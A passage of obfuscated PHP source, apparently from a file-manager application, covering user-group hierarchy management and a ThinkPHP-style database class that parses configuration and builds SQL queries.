$Ÿº›Çö[$„â©î€æ] = 0; } } } unset($í±ıÈ³ş); foreach ($Ÿº›Çö as $ó¿ªé‚ => $óıãŞƒõ) { if ($óıãŞƒõ) { continue; } $¶î²–¢í = $this->getInfoSimple($ó¿ªé‚); $Ÿº›Çö[$ó¿ªé‚] = $¶î²–¢í[$†œÇ›[32]]; } $˜ÂËÖËˆ = $GLOBALS[$†œÇ›[6]][$†œÇ›[89]][$†œÇ›[1966]]; if ($GLOBALS[$†œÇ›[494]] == $†œÇ›[88]) { $˜ÂËÖËˆ = !1; } foreach ($¶¹¥ÔÎ¢ as &$í±ıÈ³ş) { $¸¶‡¤ñš = $this->parentLevelArray($í±ıÈ³ş[$†œÇ›[511]]); $ÔÂÅ×í = $†œÇ›[12]; foreach ($¸¶‡¤ñš as $ó¿ªé‚ => $„â©î€æ) { if ($˜ÂËÖËˆ && $ó¿ªé‚ == 0) { continue; } $ÔÂÅ×í .= $Ÿº›Çö[$„â©î€æ] . $†œÇ›[8]; } if ($¸¶‡¤ñš) { $ÔÂÅ×í .= $í±ıÈ³ş[$†œÇ›[32]]; } $í±ıÈ³ş[$†œÇ›[516]] = str_replace($†œÇ›[519], $†œÇ›[8], $ÔÂÅ×í); } unset($í±ıÈ³ş); } private function _listAppendSourceRoot(&$Œõºõ¥À, $öÉåˆÅ) { $Å‹·şĞ¡ =& $_SERVER[å¸¿•¶£]; $•Ü—•æÃ = Model($Å‹·şĞ¡[832])->listSourceRoot(SourceModel::TYPE_GROUP, $öÉåˆÅ); $•Ü—•æÃ = array_to_keyvalue($•Ü—•æÃ, $Å‹·şĞ¡[496]); $•Ü—•æÃ = array_remove_key($•Ü—•æÃ, $Å‹·şĞ¡[496]); foreach ($Œõºõ¥À as &$Ûˆ„âÑƒ) { $Ûˆ„âÑƒ[$Å‹·şĞ¡[87]] = $•Ü—•æÃ[$Ûˆ„âÑƒ[$Å‹·şĞ¡[1863]]] ? $•Ü—•æÃ[$Ûˆ„âÑƒ[$Å‹·şĞ¡[1863]]] : array(); } unset($Ûˆ„âÑƒ); } protected function groupMerge($ïÜÀÍú) { $ïÜÀÍú = array_values(array_unique($ïÜÀÍú)); $ä—åÔÒ© = array(); for ($ÌùÛıúÜ = 0; $ÌùÛıúÜ < count($ïÜÀÍú); $ÌùÛıúÜ++) { $¾Ï‡½¤Ğ = !1; for ($…Ç² äñ = 0; $…Ç² äñ < count($ïÜÀÍú); $…Ç² äñ++) { if ($ÌùÛıúÜ == $…Ç² äñ) { continue; } if ($this->isParentOf($ïÜÀÍú[$…Ç² äñ], $ïÜÀÍú[$ÌùÛıúÜ])) { $¾Ï‡½¤Ğ = !0; break; } } if (!$¾Ï‡½¤Ğ) { $ä—åÔÒ©[] = $ïÜÀÍú[$ÌùÛıúÜ]; } } return $ä—åÔÒ©; } protected function isParentOf($÷ Åèè, $ˆß¬°ÁÄ) { $¸Êóöî± =& $_SERVER[å¸¿•¶£]; if (!$÷ Åèè || !$ˆß¬°ÁÄ || $÷ Åèè == $ˆß¬°ÁÄ) { return !1; } $™†úç¯° = $this->getInfoSimple($÷ Åèè); $„­ÛÉ¦Ó = $this->getInfoSimple($ˆß¬°ÁÄ); $ôèÈÜÌô = $™†úç¯°[$¸Êóöî±[511]] . $÷ Åèè . $¸Êóöî±[50]; if (substr($„­ÛÉ¦Ó[$¸Êóöî±[511]], 0, strlen($ôèÈÜÌô)) == $ôèÈÜÌô) { return !0; } return !1; } public function groupShowRoot($°šÈŸ¦, $ÇèàÄ“Ş = false) { $ÄªŸ»³ =& $_SERVER[å¸¿•¶£]; $×›¢›Äı = $this->getInfo($°šÈŸ¦); if (!$×›¢›Äı) { return array(); } $çÏÔ„ø = $this->parentLevelArray($×›¢›Äı[$ÄªŸ»³[511]]); $âüåÀâğ = array($°šÈŸ¦); if (count($çÏÔ„ø) == 0) { return $âüåÀâğ; } if ($ÇèàÄ“Ş && count($çÏÔ„ø) == 1) { return $âüåÀâğ; } if (!$×›¢›Äı[$ÄªŸ»³[466]] || !isset($×›¢›Äı[$ÄªŸ»³[466]][$ÄªŸ»³[1949]]) || $×›¢›Äı[$ÄªŸ»³[466]][$ÄªŸ»³[1949]] == $ÄªŸ»³[1918]) { return $this->groupShowRoot($çÏÔ„ø[count($çÏÔ„ø) - 1], $ÇèàÄ“Ş); } if ($×›¢›Äı[$ÄªŸ»³[466]][$ÄªŸ»³[1949]] == $ÄªŸ»³[357]) { $ßÏÅğüˆ = explode($ÄªŸ»³[50], $×›¢›Äı[$ÄªŸ»³[466]][$ÄªŸ»³[1950]]); if ($ßÏÅğüˆ) { $âüåÀâğ = array_merge($âüåÀâğ, $ßÏÅğüˆ); } } return $âüåÀâğ; } protected function resetParentLevel() { $ñ½ÏÜÔ‹ =& $_SERVER[å¸¿•¶£]; $ÑŸÅ¼­ï = $ñ½ÏÜÔ‹[1863]; $›×§Óê” = $this->select(); $›×§Óê” = array_to_keyvalue($›×§Óê”, $ÑŸÅ¼­ï); foreach ($›×§Óê” as $µ¬äéÇõ) { $üï’‡Æô = $µ¬äéÇõ; $üÚÍò×› = array(); while ($üï’‡Æô[$ñ½ÏÜÔ‹[432]] != 0) { $üÚÍò×›[] = $üï’‡Æô[$ñ½ÏÜÔ‹[432]]; $üï’‡Æô = $›×§Óê”[$üï’‡Æô[$ñ½ÏÜÔ‹[432]]]; } $üÚÍò×›[] = 0; $üÚÍò×› = $ñ½ÏÜÔ‹[50] . implode($ñ½ÏÜÔ‹[50], array_reverse($üÚÍò×›)) . $ñ½ÏÜÔ‹[50]; $this->setNamePinyin($µ¬äéÇõ[$ÑŸÅ¼­ï], $µ¬äéÇõ[$ñ½ÏÜÔ‹[32]]); $this->where(array($ÑŸÅ¼­ï => $µ¬äéÇõ[$ÑŸÅ¼­ï]))->save(array($ñ½ÏÜÔ‹[580] => $üÚÍò×›)); } return $›×§Óê”; } public function groupNameAuto($ïä†ì–½, $úÈôµğ€) { $×éÖÏ¨€ =& $_SERVER[å¸¿•¶£]; $‰²À³Š„ = $this->where(array($×éÖÏ¨€[401] => $ïä†ì–½))->getField($×éÖÏ¨€[32], !0); if (!$‰²À³Š„ || !in_array($úÈôµğ€, $‰²À³Š„)) { return $úÈôµğ€; } for ($æ’«€İõ = 1; $æ’«€İõ <= count($‰²À³Š„) + 1; $æ’«€İõ++) { $Æœ‹¦ñ = $úÈôµğ€ . "\x28{$æ’«€İõ}\x29"; if (!in_array($Æœ‹¦ñ, $‰²À³Š„)) { return $Æœ‹¦ñ; } } } public function groupSwitch($ãõØĞÌÖ, $”¸¬¤·) { $ÆãëË–ô =& $_SERVER[å¸¿•¶£]; $ğ’„ÕÔ = array($ÆãëË–ô[1863] => array($ÆãëË–ô[7], array($ãõØĞÌÖ, $”¸¬¤·))); $Õ¯´‹Ù¶ = $this->where($ğ’„ÕÔ)->select(); $Õ¯´‹Ù¶ = array_to_keyvalue($Õ¯´‹Ù¶, $ÆãëË–ô[1863]); if (!isset($Õ¯´‹Ù¶[$ãõØĞÌÖ]) || !isset($Õ¯´‹Ù¶[$”¸¬¤·]) || $Õ¯´‹Ù¶[$ãõØĞÌÖ][$ÆãëË–ô[432]] == 0) { return !1; } $ğ’„ÕÔ = array($ÆãëË–ô[1863] => $ãõØĞÌÖ); $êÜ‘Ãœ˜ = Model($ÆãëË–ô[1953])->where($ğ’„ÕÔ)->select(); if (!$êÜ‘Ãœ˜) { $êÜ‘Ãœ˜ = array(); } foreach ($êÜ‘Ãœ˜ as $ºõÃÀ²ø) { $¹·‰Åşè = $ºõÃÀ²ø[$ÆãëË–ô[1674]]; $ğ’„ÕÔ = array($ÆãëË–ô[1674] => $¹·‰Åşè, $ÆãëË–ô[1863] => $”¸¬¤·); $È€‘õ§û = Model($ÆãëË–ô[1953])->where($ğ’„ÕÔ)->find(); if (!$È€‘õ§û) { $´ä —‡ = array($”¸¬¤· => $ºõÃÀ²ø[$ÆãëË–ô[1967]]); Model($ÆãëË–ô[525])->userGroupAdd($¹·‰Åşè, $´ä —‡); } Model($ÆãëË–ô[525])->userGroupRemove($¹·‰Åşè, $ãõØĞÌÖ); } $ğ’„ÕÔ = array($ÆãëË–ô[411] => 2, $ÆãëË–ô[432] => 0, $ÆãëË–ô[410] => 1, $ÆãëË–ô[496] => array($ÆãëË–ô[7], array($ãõØĞÌÖ, $”¸¬¤·))); $Ù¸š©òá = Model($ÆãëË–ô[832])->where($ğ’„ÕÔ)->field($ÆãëË–ô[1968])->select(); $Ù¸š©òá = array_to_keyvalue($Ù¸š©òá, $ÆãëË–ô[496], $ÆãëË–ô[402]); $§„ƒ’ö  = !empty($Ù¸š©òá[$ãõØĞÌÖ]) ? $Ù¸š©òá[$ãõØĞÌÖ] : !1; if ($§„ƒ’ö ) { if (!$Ù¸š©òá[$”¸¬¤·]) { $Ù¸š©òá[$”¸¬¤·] = Model($ÆãëË–ô[832])->groupRootAdd($”¸¬¤·); } $¼ÌÁÕ©Ï = $Ù¸š©òá[$”¸¬¤·]; $ğ’„ÕÔ = array($ÆãëË–ô[432] => $§„ƒ’ö ); $Ù¸š©òá = Model($ÆãëË–ô[832])->where($ğ’„ÕÔ)->field($ÆãëË–ô[1969])->select(); if (!$Ù¸š©òá) { $Ù¸š©òá = array(); } Model($ÆãëË–ô[832])->moveClearAuth = !1; foreach ($Ù¸š©òá as $Çƒ’®–•) { $™ÇÉ¢å÷ = $Çƒ’®–•[$ÆãëË–ô[410]] == $ÆãëË–ô[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÆãëË–ô[832])->move($Çƒ’®–•[$ÆãëË–ô[402]], $¼ÌÁÕ©Ï, $™ÇÉ¢å÷); } Model($ÆãëË–ô[832])->moveClearAuth = !0; $ğ’„ÕÔ = array($ÆãëË–ô[411] => 2, $ÆãëË–ô[496] => $ãõØĞÌÖ); $ƒ¬Ğ‘ø = array($ÆãëË–ô[496] => $”¸¬¤·); Model($ÆãëË–ô[1970])->where($ğ’„ÕÔ)->save($ƒ¬Ğ‘ø); Model($ÆãëË–ô[1971])->where($ğ’„ÕÔ)->save($ƒ¬Ğ‘ø); } $this->_changeChildLevel($Õ¯´‹Ù¶[$ãõØĞÌÖ], $Õ¯´‹Ù¶[$”¸¬¤·], !0); $this->where(array($ÆãëË–ô[432] => $ãõØĞÌÖ))->save(array($ÆãëË–ô[432] => $”¸¬¤·)); $this->_clearChildrenCache($Õ¯´‹Ù¶[$”¸¬¤·]); return !0; } } goto CºŒ¤¶°£Ç; B ŸÃƒ¶‡‘: class DbSqlite3 extends DbSqlite3Base { public function query($³æ å¯Æ) { $å÷òü­¥ =& $_SERVER[å¸¿•¶£]; if (!CacheLock::fileLock($å÷òü­¥[13])) { return !1; } $¨¿À‡Ò = parent::query($³æ å¯Æ); CacheLock::fileUnLock($å÷òü­¥[13]); return $¨¿À‡Ò; } public function execute($‘ï€ÊòÕ) { $üğüĞ®· =& $_SERVER[å¸¿•¶£]; if (!CacheLock::fileLock($üğüĞ®·[13])) { return !1; } $àÀÀíÖæ = parent::execute($‘ï€ÊòÕ); CacheLock::fileUnLock($üğüĞ®·[13]); return $àÀÀíÖæ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\x6e\145\161" => "\x3c\x3e", "\x67\x74" => "\x3e", "\x65\147\x74" => "\x3e\75", "\x6c\x74" => "\x3c", "\x65\x6c\x74" => "\74\75", "\x6e\157\164\154\151\153\145" => "\116\x4f\124\40\x4c\x49\113\105", "\154\x69\153\x65" => "\x4c\x49\x4b\105", "\x69\156" => "\111\116", "\156\157\164\x69\x6e" => "\x4e\117\124\40\x49\116", "\156\157\164\x20\x69\x6e" => "\116\117\x54\40\x49\x4e", "\x62\x65\164\x77\x65\x65\x6e" => "\102\105\124\x57\105\105\x4e", "\x6e\x6f\164\142\x65\x74\x77\x65\145\x6e" => "\x4e\x4f\124\40\102\x45\x54\127\105\105\116", "\x6e\x6f\x74\40\142\x65\164\167\145\x65\x6e" => "\x4e\117\x54\40\102\x45\124\x57\105\x45\116"); protected $selectSql = "\x53\105\x4c\105\x43\124\45\x44\x49\x53\124\111\x4e\x43\x54\45\x20\45\x46\111\105\114\x44\45\40\106\x52\x4f\x4d\x20\45\124\x41\x42\114\105\x25\45\x4a\117\111\116\45\45\127\x48\105\122\105\45\45\107\122\117\x55\x50\45\45\110\x41\x56\x49\116\x47\x25\x25\117\x52\x44\105\x52\x25\x25\114\111\115\x49\124\x25\40\45\125\x4e\111\117\116\45\x25\103\x4f\115\x4d\x45\116\x54\45"; protected $bind = array(); public static function getInstance() { $–íø†àò = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[å¸¿•¶£][967], $–íø†àò); } public function factory($âîÓ•Óç = '') { $î€„÷€½ =& $_SERVER[å¸¿•¶£]; $âîÓ•Óç = $this->parseConfig($âîÓ•Óç); if (empty($âîÓ•Óç[$î€„÷€½[968]])) { think_exception(think_lang($î€„÷€½[969])); } $this->dbType = ucwords(strtolower($âîÓ•Óç[$î€„÷€½[968]])); $ê–š™™­ = $î€„÷€½[970] . $this->dbType; if (class_exists($ê–š™™­)) { $¤†¥£°ú = new $ê–š™™­($âîÓ•Óç); if ($î€„÷€½[971] != strtolower($âîÓ•Óç[$î€„÷€½[968]])) { $¤†¥£°ú->dbType = strtoupper($this->dbType); } else { $¤†¥£°ú->dbType = $this->_getDsnType($âîÓ•Óç[$î€„÷€½[923]]); } } else { think_exception(think_lang($î€„÷€½[972]) . $î€„÷€½[973] . $ê–š™™­); } return $¤†¥£°ú; } public function __call($ış½‘îÚ, $ÖÆ ‰Í) { if (method_exists($this, $ış½‘îÚ)) { return call_user_func_array(array($this, $ış½‘îÚ), $ÖÆ ‰Í); } } protected function _getDsnType($Ò«Áüè) { $õ™öèÚ‚ = explode($_SERVER[å¸¿•¶£][4], $Ò«Áüè); $°ğ®Ãæ = strtoupper(trim($õ™öèÚ‚[0])); return $°ğ®Ãæ; } private function parseConfig($“…Ìºø³ = '') { $Ä—£ö§À =& $_SERVER[å¸¿•¶£]; if (!empty($“…Ìºø³) && is_string($“…Ìºø³)) { $“…Ìºø³ = $this->parseDSN($“…Ìºø³); } elseif (is_array($“…Ìºø³)) { $“…Ìºø³ = array_change_key_case($“…Ìºø³); $“…Ìºø³ = array($Ä—£ö§À[968] => $“…Ìºø³[$Ä—£ö§À[974]], $Ä—£ö§À[895] => $“…Ìºø³[$Ä—£ö§À[975]], $Ä—£ö§À[896] => $“…Ìºø³[$Ä—£ö§À[976]], $Ä—£ö§À[893] => $“…Ìºø³[$Ä—£ö§À[977]], $Ä—£ö§À[894] => $“…Ìºø³[$Ä—£ö§À[978]], $Ä—£ö§À[21] => $“…Ìºø³[$Ä—£ö§À[979]], $Ä—£ö§À[923] => $“…Ìºø³[$Ä—£ö§À[980]], $Ä—£ö§À[17] => isset($“…Ìºø³[$Ä—£ö§À[981]]) ? $“…Ìºø³[$Ä—£ö§À[981]] : array()); } elseif (empty($“…Ìºø³)) { if (think_config($Ä—£ö§À[982]) && $Ä—£ö§À[971] != strtolower(think_config($Ä—£ö§À[983]))) { $“…Ìºø³ = $this->parseDSN(think_config($Ä—£ö§À[982])); } else { $“…Ìºø³ = array($Ä—£ö§À[968] => think_config($Ä—£ö§À[983]), $Ä—£ö§À[895] => think_config($Ä—£ö§À[984]), $Ä—£ö§À[896] => think_config($Ä—£ö§À[985]), $Ä—£ö§À[893] => think_config($Ä—£ö§À[986]), $Ä—£ö§À[894] => think_config($Ä—£ö§À[987]), $Ä—£ö§À[21] => think_config($Ä—£ö§À[246]), $Ä—£ö§À[923] => think_config($Ä—£ö§À[982]), $Ä—£ö§À[17] => think_config($Ä—£ö§À[988])); } } return $“…Ìºø³; } protected function initConnect($üÅÕÃÒŒ = true) { if (1 == think_config($_SERVER[å¸¿•¶£][22])) { $this->_linkID = $this->multiConnect($üÅÕÃÒŒ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $è¼“²¸ => $¥İ–¡Â) { $this->_linkID = $¥İ–¡Â; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ò©©ûÉ = false) { $‡Óı´Ë§ =& $_SERVER[å¸¿•¶£]; static $òÌ÷ğúÌ = array(); static $ü«µé÷¢ = -1; if (empty($òÌ÷ğúÌ)) { foreach ($this->config as $ÕîÑ¥Ÿ¹ => $ÄÂû³Ó) { $òÌ÷ğúÌ[$ÕîÑ¥Ÿ¹] = explode($‡Óı´Ë§[50], $ÄÂû³Ó); } } if (think_config($‡Óı´Ë§[989])) { if ($ò©©ûÉ || think_config($‡Óı´Ë§[395]) === !0) { $½¥Œˆ€ = floor(mt_rand(0, think_config($‡Óı´Ë§[990]) - 1)); $ü«µé÷¢ = $½¥Œˆ€; } else { if (is_numeric(think_config($‡Óı´Ë§[991]))) { $½¥Œˆ€ = think_config($‡Óı´Ë§[991]); } else { $½¥Œˆ€ = floor(mt_rand(think_config($‡Óı´Ë§[990]), count($òÌ÷ğúÌ[$‡Óı´Ë§[893]]) - 1)); } } } else { $½¥Œˆ€ = floor(mt_rand(0, count($òÌ÷ğúÌ[$‡Óı´Ë§[893]]) - 1)); $ü«µé÷¢ = $½¥Œˆ€; } $½¥Œˆ€ = $ü«µé÷¢ !== -1 ? $ü«µé÷¢ : $½¥Œˆ€; $Ñ™ˆñß = array($‡Óı´Ë§[895] => isset($òÌ÷ğúÌ[$‡Óı´Ë§[895]][$½¥Œˆ€]) ? $òÌ÷ğúÌ[$‡Óı´Ë§[895]][$½¥Œˆ€] : $òÌ÷ğúÌ[$‡Óı´Ë§[895]][0], $‡Óı´Ë§[896] => isset($òÌ÷ğúÌ[$‡Óı´Ë§[896]][$½¥Œˆ€]) ? $òÌ÷ğúÌ[$‡Óı´Ë§[896]][$½¥Œˆ€] : $òÌ÷ğúÌ[$‡Óı´Ë§[896]][0], $‡Óı´Ë§[893] => isset($òÌ÷ğúÌ[$‡Óı´Ë§[893]][$½¥Œˆ€]) ? $òÌ÷ğúÌ[$‡Óı´Ë§[893]][$½¥Œˆ€] : $òÌ÷ğúÌ[$‡Óı´Ë§[893]][0], $‡Óı´Ë§[894] => isset($òÌ÷ğúÌ[$‡Óı´Ë§[894]][$½¥Œˆ€]) ? $òÌ÷ğúÌ[$‡Óı´Ë§[894]][$½¥Œˆ€] : $òÌ÷ğúÌ[$‡Óı´Ë§[894]][0], $‡Óı´Ë§[21] => isset($òÌ÷ğúÌ[$‡Óı´Ë§[21]][$½¥Œˆ€]) ? $òÌ÷ğúÌ[$‡Óı´Ë§[21]][$½¥Œˆ€] : $òÌ÷ğúÌ[$‡Óı´Ë§[21]][0], $‡Óı´Ë§[923] => isset($òÌ÷ğúÌ[$‡Óı´Ë§[923]][$½¥Œˆ€]) ? $òÌ÷ğúÌ[$‡Óı´Ë§[923]][$½¥Œˆ€] : $òÌ÷ğúÌ[$‡Óı´Ë§[923]][0], $‡Óı´Ë§[17] => isset($òÌ÷ğúÌ[$‡Óı´Ë§[17]][$½¥Œˆ€]) ? $òÌ÷ğúÌ[$‡Óı´Ë§[17]][$½¥Œˆ€] : $òÌ÷ğúÌ[$‡Óı´Ë§[17]][0]); return $this->connect($Ñ™ˆñß, $½¥Œˆ€); } public function parseDSN($şÁ¥Ë) { $¯ƒÁ®öú =& $_SERVER[å¸¿•¶£]; if (empty($şÁ¥Ë)) { return !1; } $¿¨ªéØ˜ = parse_url($şÁ¥Ë); if ($¿¨ªéØ˜[$¯ƒÁ®öú[181]]) { $©ùòÈ = array($¯ƒÁ®öú[968] => $¿¨ªéØ˜[$¯ƒÁ®öú[181]], $¯ƒÁ®öú[895] => isset($¿¨ªéØ˜[$¯ƒÁ®öú[590]]) ? $¿¨ªéØ˜[$¯ƒÁ®öú[590]] : $¯ƒÁ®öú[12], $¯ƒÁ®öú[896] => isset($¿¨ªéØ˜[$¯ƒÁ®öú[992]]) ? $¿¨ªéØ˜[$¯ƒÁ®öú[992]] : $¯ƒÁ®öú[12], $¯ƒÁ®öú[893] => isset($¿¨ªéØ˜[$¯ƒÁ®öú[182]]) ? $¿¨ªéØ˜[$¯ƒÁ®öú[182]] : $¯ƒÁ®öú[12], $¯ƒÁ®öú[894] => isset($¿¨ªéØ˜[$¯ƒÁ®öú[183]]) ? $¿¨ªéØ˜[$¯ƒÁ®öú[183]] : $¯ƒÁ®öú[12], $¯ƒÁ®öú[21] => isset($¿¨ªéØ˜[$¯ƒÁ®öú[84]]) ? substr($¿¨ªéØ˜[$¯ƒÁ®öú[84]], 1) : $¯ƒÁ®öú[12]); } else { preg_match($¯ƒÁ®öú[993], trim($şÁ¥Ë), $™øğïÒÀ); $©ùòÈ = array($¯ƒÁ®öú[968] => $™øğïÒÀ[1], $¯ƒÁ®öú[895] => $™øğïÒÀ[2], $¯ƒÁ®öú[896] => $™øğïÒÀ[3], $¯ƒÁ®öú[893] => $™øğïÒÀ[4], $¯ƒÁ®öú[894] => $™øğïÒÀ[5], $¯ƒÁ®öú[21] => $™øğïÒÀ[6]); } $©ùòÈ[$¯ƒÁ®öú[923]] = $¯ƒÁ®öú[12]; return $©ùòÈ; } protected function debug() { $³‰Ì†ò‡ =& $_SERVER[å¸¿•¶£]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $³‰Ì†ò‡[994]; if (think_config($³‰Ì†ò‡[995])) { think_status($³‰Ì†ò‡[996]); think_trace($this->queryStr . $³‰Ì†ò‡[997] . think_status($³‰Ì†ò‡[24], $³‰Ì†ò‡[996], 6) . $³‰Ì†ò‡[998], $³‰Ì†ò‡[12], $³‰Ì†ò‡[999]); } } protected function parseLock($ƒŞ¸ì»è = false) { $…Şæ˜•Œ =& $_SERVER[å¸¿•¶£]; if (!$ƒŞ¸ì»è) { return $…Şæ˜•Œ[12]; } if ($…Şæ˜•Œ[925] == $this->dbType) { return $…Şæ˜•Œ[1000]; } return $…Şæ˜•Œ[1001]; } protected function parseSet($â‰ÙŠñ) { $¢É„ÎÑ® =& $_SERVER[å¸¿•¶£]; foreach ($â‰ÙŠñ as $‹ƒ‹®î› => $¬Šë”Òç) { if (is_array($¬Šë”Òç) && $¢É„ÎÑ®[297] == $¬Šë”Òç[0]) { $½‰™ÍØş[] = $this->parseKey($‹ƒ‹®î›) . $¢É„ÎÑ®[891] . $¬Šë”Òç[1]; } elseif (is_scalar($¬Šë”Òç) || is_null($¬Šë”Òç)) { $½‰™ÍØş[] = $this->parseKey($‹ƒ‹®î›) . $¢É„ÎÑ®[891] . $this->parseValue($¬Šë”Òç); } } return $¢É„ÎÑ®[1002] . implode($¢É„ÎÑ®[50], $½‰™ÍØş); } protected function bindParam($¥áÃ›·Ï, $ƒËÆ¨’›) { $this->bind[$_SERVER[å¸¿•¶£][4] . $¥áÃ›·Ï] = $ƒËÆ¨’›; } protected function parseBind($ßª‹ã€‰) { $ßª‹ã€‰ = array_merge($this->bind, $ßª‹ã€‰); $this->bind = array(); return $ßª‹ã€‰; } function parseKey(&$¤‡÷¦²ƒ, $Ø½­»âÔ = true) { if ($Ø½­»âÔ) { $¤‡÷¦²ƒ = $this->parseKeyCheck($¤‡÷¦²ƒ); } return $¤‡÷¦²ƒ; } function parseKeyCheck($í‘×…) { $Á¶ã´Ø© =& $_SERVER[å¸¿•¶£]; $í‘×… = trim($í‘×…); if (!preg_match($Á¶ã´Ø©[1003], $í‘×…)) { think_exception($Á¶ã´Ø©[1004] . $í‘×…); } return $í‘×…; } protected function parseValue($òä·İÏ) { $î‹‡ÍÃ¼ =& $_SERVER[å¸¿•¶£]; if (is_string($òä·İÏ)) { $òä·İÏ = $î‹‡ÍÃ¼[964] . $this->escapeString($òä·İÏ) . $î‹‡ÍÃ¼[964]; } elseif (isset($òä·İÏ[0]) && is_string($òä·İÏ[0]) && strtolower($òä·İÏ[0]) == $î‹‡ÍÃ¼[297]) { $òä·İÏ = $this->escapeString($òä·İÏ[1]); } elseif (is_array($òä·İÏ)) { $òä·İÏ = array_map(array($this, $î‹‡ÍÃ¼[965]), $òä·İÏ); } elseif (is_bool($òä·İÏ)) { $òä·İÏ = $òä·İÏ ? $î‹‡ÍÃ¼[88] : $î‹‡ÍÃ¼[198]; } elseif (is_null($òä·İÏ)) { $òä·İÏ = $î‹‡ÍÃ¼[103]; } return $òä·İÏ; } protected function parseField($ö›¦ŠÈŠ) { $ØêÙ·Á =& $_SERVER[å¸¿•¶£]; if (is_string($ö›¦ŠÈŠ) && strpos($ö›¦ŠÈŠ, $ØêÙ·Á[50])) { $ö›¦ŠÈŠ = explode($ØêÙ·Á[50], $ö›¦ŠÈŠ); } if (is_array($ö›¦ŠÈŠ)) { $Å¨ƒËæÖ = array(); foreach ($ö›¦ŠÈŠ as $ ¸íŸ¥¯ => $â¶şûÏÛ) { if (!is_numeric($ ¸íŸ¥¯)) { $Å¨ƒËæÖ[] = $this->parseKey($ ¸íŸ¥¯, !1) . $ØêÙ·Á[1005] . $this->parseKey($â¶şûÏÛ); } else { $Å¨ƒËæÖ[] = $this->parseKey($â¶şûÏÛ); } } $¡Ô‹ŸÍ = implode($ØêÙ·Á[50], $Å¨ƒËæÖ); } elseif (is_string($ö›¦ŠÈŠ) && !empty($ö›¦ŠÈŠ)) { $¡Ô‹ŸÍ = $ö›¦ŠÈŠ; } else { $¡Ô‹ŸÍ = $ØêÙ·Á[189]; } return $¡Ô‹ŸÍ; } protected function parseTable($Õ—ë’ï) { $…ÓÔ¯âû =& $_SERVER[å¸¿•¶£]; if (is_array($Õ—ë’ï)) { $•—³Ì¤ = array(); foreach ($Õ—ë’ï as $÷Õ¥š©À => $Ë³¢õÓ) { if (!is_numeric($÷Õ¥š©À)) { $•—³Ì¤[] = $this->parseKey($÷Õ¥š©À) . $…ÓÔ¯âû[53] . $this->parseKey($Ë³¢õÓ); } else { $•—³Ì¤[] = $this->parseKey($÷Õ¥š©À); } } $Õ—ë’ï = $•—³Ì¤; } elseif (is_string($Õ—ë’ï)) { if (strstr($Õ—ë’ï, $…ÓÔ¯âû[53])) { return $Õ—ë’ï; } $Õ—ë’ï = explode($…ÓÔ¯âû[50], $Õ—ë’ï); array_walk($Õ—ë’ï, array($this, $…ÓÔ¯âû[913])); } return $…ÓÔ¯âû[907] . trim(implode($…ÓÔ¯âû[1006], $Õ—ë’ï), $…ÓÔ¯âû[385]) . $…ÓÔ¯âû[907]; } protected function parseWhere($éÃ¨–†) { $Ï©€±¯… =& $_SERVER[å¸¿•¶£]; $ëÀÔÙÑ… = $Ï©€±¯…[12]; if (is_string($éÃ¨–†)) { $ëÀÔÙÑ… = $éÃ¨–†; } else { $Ì‰õóÀı = isset($éÃ¨–†[$Ï©€±¯…[1007]]) ? strtoupper($éÃ¨–†[$Ï©€±¯…[1007]]) : $Ï©€±¯…[12]; if (in_array($Ì‰õóÀı, array($Ï©€±¯…[1008], $Ï©€±¯…[1009], $Ï©€±¯…[1010]))) { $Ì‰õóÀı = $Ï©€±¯…[53] . $Ì‰õóÀı . $Ï©€±¯…[53]; unset($éÃ¨–†[$Ï©€±¯…[1007]]); } else { $Ì‰õóÀı = $Ï©€±¯…[1011]; } foreach ($éÃ¨–† as $ü„¯„³§ => $ºøæË ) { $ëÀÔÙÑ… .= $Ï©€±¯…[277]; if (is_numeric($ü„¯„³§)) { $ü„¯„³§ = $Ï©€±¯…[1012]; } if (0 === strpos($ü„¯„³§, $Ï©€±¯…[11])) { $ëÀÔÙÑ… .= $this->parseThinkWhere($ü„¯„³§, $ºøæË ); } else { if (!preg_match($Ï©€±¯…[1013], trim($ü„¯„³§))) { think_exception(think_lang($Ï©€±¯…[1014]) . $Ï©€±¯…[4] . $ü„¯„³§); } $üÅıøŸ = is_array($ºøæË ) && isset($ºøæË [$Ï©€±¯…[1015]]); $ü„¯„³§ = trim($ü„¯„³§); if (strpos($ü„¯„³§, $Ï©€±¯…[283])) { $òì€Â¡¹ = explode($Ï©€±¯…[283], $ü„¯„³§); $é§¦ŠÙ´ = array(); foreach ($òì€Â¡¹ as $¥åÓğ°Î => $©Ôò‘ù£) { $í†Äíİê = $üÅıøŸ ? $ºøæË [$¥åÓğ°Î] : $ºøæË ; $é§¦ŠÙ´[] = $Ï©€±¯…[260] . $this->parseWhereItem($this->parseKey($©Ôò‘ù£), $í†Äíİê) . $Ï©€±¯…[912]; } $ëÀÔÙÑ… .= implode($Ï©€±¯…[1016], $é§¦ŠÙ´); } elseif (strpos($ü„¯„³§, $Ï©€±¯…[284])) { $òì€Â¡¹ = explode($Ï©€±¯…[284], $ü„¯„³§); $é§¦ŠÙ´ = array(); foreach ($òì€Â¡¹ as $¥åÓğ°Î => $©Ôò‘ù£) { $í†Äíİê = $üÅıøŸ ? $ºøæË [$¥åÓğ°Î] : $ºøæË ; $é§¦ŠÙ´[] = $Ï©€±¯…[260] . $this->parseWhereItem($this->parseKey($©Ôò‘ù£), $í†Äíİê) . $Ï©€±¯…[912]; } $ëÀÔÙÑ… .= implode($Ï©€±¯…[1011], $é§¦ŠÙ´); } else { $ëÀÔÙÑ… .= $this->parseWhereItem($this->parseKey($ü„¯„³§), $ºøæË ); } } $ëÀÔÙÑ… .= $Ï©€±¯…[278] . $Ì‰õóÀı; } 